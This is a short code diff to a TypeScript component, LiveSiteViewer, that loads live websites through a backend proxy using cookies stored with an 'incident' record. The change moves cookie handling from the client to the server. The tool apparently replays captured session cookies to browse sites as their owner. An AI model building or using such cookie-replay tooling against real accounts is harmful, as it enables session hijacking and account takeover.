@@ -94,20 +94,16 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
   }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, (incident as any).cookieExcerpt, incident.host]);
 
   // Fetch raw content from backend (cookies + DNS tunnel via site-proxy)
+  // Proxy automatically fetches cookies from DB using incident_id
   const fetchRawContent = async (url: string): Promise<string> => {
-    console.log('[LocalProxy] Fetching raw content:', url, 'with', cookies.length, 'cookies');
+    console.log('[LocalProxy] Fetching raw content:', url, 'for incident:', incident.id);
     
-    // Build query params for GET-style proxy
+    // Build query params - proxy will fetch cookies from DB automatically
     const params = new URLSearchParams({
       url,
       incident: incident.id,
       rawContent: 'true'
     });
-    
-    // Add cookies as individual params for better proxy handling
-    if (cookies.length > 0) {
-      params.append('cookies', JSON.stringify(cookies));
-    }
     
     const response = await fetch(`${PROXY_BASE}?${params.toString()}`, {
       method: 'GET',
